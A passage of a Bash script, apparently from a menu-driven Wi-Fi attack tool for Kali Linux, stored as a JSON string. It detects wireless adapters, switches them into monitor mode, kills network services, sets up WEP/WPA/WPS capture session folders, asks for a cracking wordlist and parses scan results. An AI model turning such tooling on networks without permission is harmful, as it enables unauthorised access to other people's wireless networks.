pause\n\n\t\tfi\n\n\t\t;;\n\n\t\t\"channel\")\n\t\tif [ \"$channel\" == \"\" ];then\n\n\t\t\tbanner\n\t\t\tbannerStats\n\n\t\t\techo \"\"\n\t\t\techo \"There is currently no CHANNEL saved in the previous session!\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\t\t\techo \"Press ENTER to return to previous menu....\"\n\t\t\techo \"\"\n\t\t\techo \"\"\n\n\t\t\tread pause\n\n\t\t\t$lastMenuID\n\t\tfi\n\t\t;;\n\n\tesac\n\n}\n\n\n############################################################################\n#   EMPTY VARIABLE CHECKS END   ############################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   INTERFACE STUFF BEGIN   ################################################\n############################################################################\n\ncheckInterfaceMode(){\n\n\tcurrentTask=\"checkInterfaceMode\"\n\n\tinterfaceModeCheck=$(iwconfig | grep \"$interfaceMonitor\" | head -c 5)\n\n\tcase \"$interfaceModeCheck\" in\n\n\t\t\"\")\n\t\tinterfaceMode=\"0\"\n\t\t#break;\n\t\t;;\n\n\t\t*)\n\t\tinterfaceMode=\"2\"\n\t\t#break;\n\t\t;;\n\n\tesac\n\t\t\n}\n\n\ncheckMultipleAdapters(){\n\n\tcurrentTask=\"checkMultipleAdapters\"\n\n\tinterfaceNumber=\"0\"\n\tinterfaceNumberMax=\"99\"\n\tinterfacesFound=\"0\"\n\n\twhile [ $interfaceNumber -le $interfaceNumberMax ]\n\n\tdo\n\t\tbanner\n\t\t$white\n\t\techo \"\"\n\t\techo \"Checking WiFi Adapters....\"\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tinterfaceCheck=$(iwconfig | grep \"wlan$interfaceNumber\" | head -c 5)\n\t\tinterfaceMonitor=\"$interfaceCheck\"\"mon\"\n\t\tinterfaceName=$interfaceMonitor\n\n\t\tcase \"$interfaceCheck\" in\n\n\t\t\t\"\")\n\t\t\tinterfaceNumber=\"99\"\n\t\t\tinterfaceNumberMax=\"99\"\n\t\t\tbreak;\n\t\t\t;;\n\n\t\t\t*)\n\t\t\t#interface=\"$interfaceCheck\"\n\t\t\tinterfaceNumber=$(($interfaceNumber+1))\n\t\t\tinterfacesFound=$(($interfacesFound+1))\n\t\t\t;;\n\n\t\tesac\n\n\t\t#echo \"interfaceNumber: $interfaceNumber\"\n\t\t#echo \"interfaceNumberMax: $interfaceNumberMax\"\n\t\t#echo \"interfaceCheck: $interfaceCheck\"\n\t\t#echo \"interfacesFound: $interfacesFound\"\n\t\t#read pause\n\n\t\t\n\tdone\n\n}\n\n\ngetWirelessInterfaceNames(){\n\n\tcurrentTask=\"getWirelessInterfaceNames\"\n\n\t#if [ ! -z \"$showAdapterUsbAtherosAR9271\" ]; then\n\t\n\t#\tshowAdapterOneName=\"$showAdapterUsbAtherosAR9271\"\n\n\t#fi \n\n}\n\n\ngetWirelessInterfaces(){\n\n\tcurrentTask=\"getWirelessInterfaces\"\n\n\t# Check for the \"refresh\" flag and DO NOT display text if enabled\n\t# This is for the 2nd \"getWirelessInterfaces\" call for some forgotten reason :rolleyes: (Hides Text)\n\tcase \"$1\" in\n\n\t\t# This is just splashing some text to wait out the 5 minute timeout....make it look useful!!\n\t\t\"refresh\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Preparing $encryptionTypeText Attack....\"\n\t\techo \"\"\n\t\t;;\n\n\t\t*)\n\t\tcheckMultipleAdapters\n\n\t\tbanner\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"To Change Adapter Settings, Press \\\"C\\\" Now\"\n\t\t$white\n\t\t#echo \"\"\n\t\t#$cyan\n\t\t#echo \"Current: $interface\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"To Select Interface From Discovered, Choose From Below\"\n\t\techo \"\"\n\t\t$green\n\n\t\t# If no adpaters found\n\t\tif [ $interfacesFound -eq \"0\" ]; then\n\t\t\t$red\n\t\t\techo \"NO WIFI ADAPTER FOUND!!!\"\n\t\t\t$cyan\n\t\tfi\n\n\t\t# If only one device detected\n\t\tif [ $interfacesFound -eq \"1\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"2\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"3\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"4\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"5\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"6\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\t\techo \"6) wlan5 ($showAdapterSixName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"7\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\t\techo \"6) wlan5 ($showAdapterSixName)\"\n\t\t\techo \"7) wlan6 ($showAdapterSevenName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"8\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\t\techo \"6) wlan5 ($showAdapterSixName)\"\n\t\t\techo \"7) wlan6 ($showAdapterSevenName)\"\n\t\t\techo \"8) wlan7 ($showAdapterEightName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"9\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\t\techo \"6) wlan5 ($showAdapterSixName)\"\n\t\t\techo \"7) wlan6 ($showAdapterSevenName)\"\n\t\t\techo \"8) wlan7 ($showAdapterEightName)\"\n\t\t\techo \"9) wlan8 ($showAdapterNineName)\"\n\t\tfi\n\n\t\tif [ $interfacesFound -eq \"10\" ]; then\n\t\t\tgetWirelessInterfaceNames\n\t\t\techo \"1) wlan0 ($showAdapterOneName)\"\n\t\t\techo \"2) wlan1 ($showAdapterTwoName)\"\n\t\t\techo \"3) wlan2 ($showAdapterThreeName)\"\n\t\t\techo \"4) wlan3 ($showAdapterFourName)\"\n\t\t\techo \"5) wlan4 ($showAdapterFiveName)\"\n\t\t\techo \"6) wlan5 ($showAdapterSixName)\"\n\t\t\techo \"7) wlan6 ($showAdapterSevenName)\"\n\t\t\techo \"8) wlan7 ($showAdapterEightName)\"\n\t\t\techo \"9) wlan8 ($showAdapterNineName)\"\n\t\t\techo \"10) wlan9 ($showAdapterTenName)\"\n\t\tfi\n\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"TO USE DEFAULTS, JUST PRESS ENTER!\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Continuing In 10 Seconds....\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t;;\n\n\tesac\n\n\tread -t 10 manualInterface\n\n\thotkeyInput=\"$manualInterface\"\n\n\tloadMenuHotkeys \"$hotkeyInput\"\n\n\tcase \"$manualInterface\" in\n\n\t\t\"\")\n\t\tcase \"$isKaliTwo\" in\n\n\t\t\t\"0\")\n\t\t\tinterface=$(iwconfig | grep \"wlan\" | head -c 5)\n\t\t\t#interfaceMonitor=$(iwconfig | grep \"mon\" | head -c 4)\n\t\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\t\tinterfaceName=$interfaceMonitor\n\t\t\t;;\n\n\t\t\t\"1\")\n\t\t\tinterface=$(iwconfig | grep \"wlan\" | head -c 5)\n\t\t\t#interfaceMonitor=$(iwconfig | grep \"wlan\" | head -c 8)\n\t\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\t\tinterfaceName=$interfaceMonitor\n\t\t\t#fixKaliTwoMonError\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\t\t\"1\")\n\t\tinterface=\"wlan0\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"2\")\n\t\tinterface=\"wlan1\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"3\")\n\t\tinterface=\"wlan2\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"4\")\n\t\tinterface=\"wlan3\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"5\")\n\t\tinterface=\"wlan4\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"6\")\n\t\tinterface=\"wlan5\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"7\")\n\t\tinterface=\"wlan6\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"8\")\n\t\tinterface=\"wlan7\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"9\")\n\t\tinterface=\"wlan8\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"10\")\n\t\tinterface=\"wlan9\"\n\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\tinterfaceName=\"$interfaceMonitor\"\n\t\t;;\n\n\t\t\"C\" | \"c\")\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Enter Managed Mode Interface Name and press ENTER:\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Example: wlan0\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"If Nothing Is Entered, Then Default Values Are Used\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tread manualSelectionManaged\n\n\t\tcase \"$manualSelectionManaged\" in\n\n\t\t\t\"\")\n\t\t\tinterface=$(iwconfig | grep \"wlan\" | head -c 5)\n\t\t\tmanualSelectionManaged=\"$interface\"\n\t\t\t;;\n\n\t\t\t*)\n\t\t\tinterface=\"$manualSelectionManaged\"\n\t\t\tinterfaceName=\"$interface$manualSelectionManaged\"\n\t\t\t;;\n\n\t\tesac\n\n\t\tbanner\n\t\techo \"\"\n\t\techo \"Enter Monitor Mode Interface Name and press ENTER:\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"Example: $manualSelectionManaged\"\"mon\"\n\t\techo \"\"\n\t\techo \"\"\n\t\techo \"\"\n\t\t$cyan\n\t\techo \"If Nothing Is Entered, Then Default Values Are Used\"\n\t\t$white\n\t\techo \"\"\n\t\techo \"\"\n\n\t\tread manualSelectionMonitor\n\n\t\tcase \"$manualSelectionMonitor\" in\n\n\t\t\t\"\")\n\t\t\tinterfaceMonitor=\"$interface\"\"mon\"\n\t\t\t;;\n\n\t\t\t*)\n\t\t\tinterfaceMonitor=\"$manualSelectionMonitor\"\"mon\"\n\t\t\tinterfaceName=\"$manualSelectionMonitor\"\"mon\"\n\t\t\t;;\n\n\t\tesac\n\t\t;;\n\n\t\t\"W\" | \"w\")\n\t\t#returnTo=\"getWirelessInterfaces\"\n\t\t#spoofMacAddress\n\t\tgetWirelessInterfaces\n\t\t;;\n\n\t\t*)\n\t\tgetWirelessInterfaces\n\t\t;;\n\n\tesac\n\n\t#echo \"$interface\"\n\t#echo \"$interfaceMonitor\"\n\t#read pause\n\n}\n\n\ndisableChannelHopping(){\n\n\tsleep 1\n\tifconfig $interface down\n\n}\n\n\nenableChannelHopping(){\n\n\tsleep 1\n\tifconfig $interface up\n\n}\n\ninterfaceUp(){\n\n\t#ifconfig $interface up\n\tifconfig $interfaceMonitor up\n\n}\n\n\ninterfaceDown(){\n\n\t#ifconfig $interface down\n\tifconfig $interfaceMonitor down\n\n}\n\n\ninterfaceManaged(){\n\n\t#iwconfig wlan0mon mode managed\n\tiwconfig $interfaceMonitor mode managed\n\n}\n\n\ninterfaceMonitor(){\n\n\t#iwconfig wlan0mon mode monitor\n\tiwconfig $interfaceMonitor mode monitor\n\n}\n\n\nfixKaliTwoMonError(){\n\n\tcurrentTask=\"fixKaliTwoMonError\"\n\n\tcase \"$isDebugMode\" in\n\t\n\t\t\"1\")\n\t\techo \"DEBUG: Kali 2.x Fix - Step 1\"\n\t\techo \"\"\n\t\techo \"$interface\"\n\t\techo \"$interfaceMonitor\"\n\t\tread pause\n\t\t;;\n\tesac\n\n\tifconfig $interfaceMonitor down\n\tsleep 2\n\tiwconfig $interfaceMonitor mode monitor\n\tsleep 2\n\tifconfig $interfaceMonitor up\n\n\tcase \"$isDebugMode\" in\n\t\n\t\t\"1\")\n\t\techo \"DEBUG: Kali 2.x Fix - Step 2\"\n\t\techo \"\"\n\t\techo \"$interface\"\n\t\techo \"$interfaceMonitor\"\n\t\tread pause\n\t\t;;\n\tesac\n}\n\n\n############################################################################\n#   INTERFACE STUFF END   ##################################################\n############################################################################\n\n\n\n############################################################################\n#   MISC STUFF BEGIN   #####################################################\n############################################################################\n\n\n# Reset Session Values Back To Default\nsetDefaultSession(){\n\n\tcurrentTask=\"setDefaultSession\"\n\n\tsessionID=\"0\"\n\n\tcapturePath=$(echo \"$PWD/sessions\")\n\tcapturePathWEP=$(echo \"$PWD/sessions/wep\")\n\tcapturePathWPS=$(echo \"$PWD/sessions/wps\")\n\tcapturePathWPA=$(echo \"$PWD/sessions/wpa\")\n\tcapturePathWPA2=$(echo \"$PWD/sessions/wpa2\")\n\n}\n\n\ngetCustomList(){\n\n\tbanner\n\tbannerStats\n\n\tcurrentTask=\"getCustomList\"\n\n\techo \"\"\n\techo \"Enter the path to the list and press ENTER:\"\n\techo \"\"\n\techo \"\"\n\techo \"Example: /pentest/wordlists/dictionary1.txt\"\n\techo \"\"\n\techo \"\"\n\n\n\tread tmpCustomList\n\n\tcase \"$tmpCustomList\" in\n\n\t\t\"\")\n\t\tgetCustomList\n\t\t;;\n\n\t\t*)\n\t\twordlist=\"$tmpCustomList\"\n\t\t;;\n\n\tesac\n\n}\n\n\ngetBSSIDCharOnly(){\n\n\tcurrentTask=\"getBSSIDCharOnly\"\n\n\tif [ \"$bssid\" != \"\" ];then\n\n\t\tbssidCharOnly=$(echo $bssid | sed 's/[\\:]//g')\n\tfi\n\n}\n\n\ngetCurrentDate(){\n\n\tdisplayDate=$(date +\"%D\")\n\tdisplayDate2=$(date +\"%Y-%m-%d\")\n\tdisplayDate3=$(date +\"%Y%m%d\")\n\n}\n\n\ngetCurrentTime(){\n\n\tdisplayTime=$(date +\"%T\")\n\n}\n\n\ngetCurrentDateAndTime(){\n\n\tdisplayDateAndTime=$(date +\"%D - %T\")\n\tdisplayDateAndTime2=$(date +\"%Y%m%d / %T\")\n\tdisplayDateAndTime3=$(date +\"%Y-%m-%d / %T\")\n\n}\n\n\nfixNegativeOneChannelError(){\n\n\tairmon-ng check kill\n\n}\n\n\nstartNetworkManager(){\n\n\tNetworkManager\n\n}\n\n\nkillNetworkManager(){\n\n\tcurrentPID=$(ps -A | grep NetworkManager | cut -c 1-5)\n\tkillTask=$(kill $currentPID)\n\n\t#echo \"$currentPID\"\n\t#echo \"$killTask\"\n\n\t#read pause\n\n}\n\n\nwpaSupplicantKill(){\n\n\tcurrentTask=\"wpaSupplicantKill\"\n\n\t#currentPID=$(ps -A | grep wpa_supplicant | cut -c 1-5)\n\t#killTask=$(kill $currentPID)\n\n\tkillall wpa_supplicant\n\n\t#echo \"$currentPID\"\n\t#echo \"$killTask\"\n\n\t#read pause\n\n}\n\nwpaSupplicantEnable(){\n\n\tcurrentTask=\"wpaSupplicantEnable\"\n\n\tsystemctl enable wpa_supplicant\n\n}\n\nwpaSupplicantDisable(){\n\n\tcurrentTask=\"wpaSupplicantDisable\"\n\n\tsystemctl disable wpa_supplicant\n\n}\n\n\n# This will output all variables and values currently in use, and is for debugging purposes only\ndumpEnvironment(){\n\n\tcurrentTask=\"dumpEnvironment\"\n\n\t\n\n}\n\n\nreadXML(){\n\n\tlocal ifsType=\"$1\"\n\tlocal ifsCustom=\"$2\"\n\n\tcurrentTask=\"readXML\"\n\n\tcase \"$ifsType\" in\n\n\t\t\"\")\n\t\tlocal IFS=\\> ; read -d \\< E C ;\n\t\t;;\n\n\t\t\"essid\")\n\t\tlocal IFS=\\> ; read -d \\< E C ;\n\t\t;;\n\n\t\t\"bssid\")\n\t\tlocal IFS=\\> ; read -d \\< E C ;\n\t\t;;\n\n\t\t\"channel\")\n\t\tlocal IFS=\\> ; read -d \\< E C ;\n\t\t;;\n\n\t\t# Takes 2 parameters\n\t\t\"custom\")\n\t\tlocal IFS=$ifsCustom ; read -d $ifsCustom E C ;\n\t\t;;\n\n\tesac\n\n\t\n\n}\n\n\n\n\nopenScanTargetsAsText(){\n\n\twhile readXML \"essid\" \"\"; do\n\n    \tif [[ $E = \" cloaked=\\\"false\\\"\" ]]; then\n        \techo $C\n    \tfi\n\n\tdone < \"$defaultScanOutputXML\" >> \"$defaultScanOutputTXT\"\n\n\twhile readXML \"bssid\" \"\"; do\n\n    \tif [[ $E = BSSID ]]; then\n        \techo $C\n    \tfi\n\n\tdone < \"$defaultScanOutputXML\" >> \"$defaultScanOutputTXT\"\n\n\twhile readXML \"channel\" \"\"; do\n\n    \tif [[ $E = channel ]]; then\n        \techo $C\n    \tfi\n\n\tdone < \"$defaultScanOutputXML\" >> \"$defaultScanOutputTXT\"\n\n\t$terminal gedit \"$defaultScanOutputTXT\"\n}\n\n\ncleanTempScanResultsFile(){\n\n\tflag=\"$1\"\n\n\tcase \"$flag\" in\n\n\t\t\"all\")\n\t\trm \"$defaultScanOutputIVS\"\n\t\trm \"$defaultScanOutputXML\"\n\t\trm \"$defaultScanOutputTXT\"\n\t\t;;\n\n\t\t\"ivs\")\n\t\trm \"$defaultScanOutputIVS\"\n\t\t;;\n\n\t\t\"xml\")\n\t\trm \"$defaultScanOutputXML\"\n\t\t;;\n\n\t\t\"txt\")\n\t\trm \"$defaultScanOutputTXT\"\n\t\t;;\n\n\tesac\n\n}\n\n\n############################################################################\n#   MISC STUFF END   #######################################################\n############################################################################\n\n\n\n\n\n############################################################################\n#   INITIAL LAUNCH BEGIN   #################################################\n############################################################################\n\n\ninitMain\n\n\n############################################################################\n#   INITIAL LAUNCH END   ###################################################\n############################################################################\n\n\n\n\n\n\n"
        }
      ]
    }
  ]
}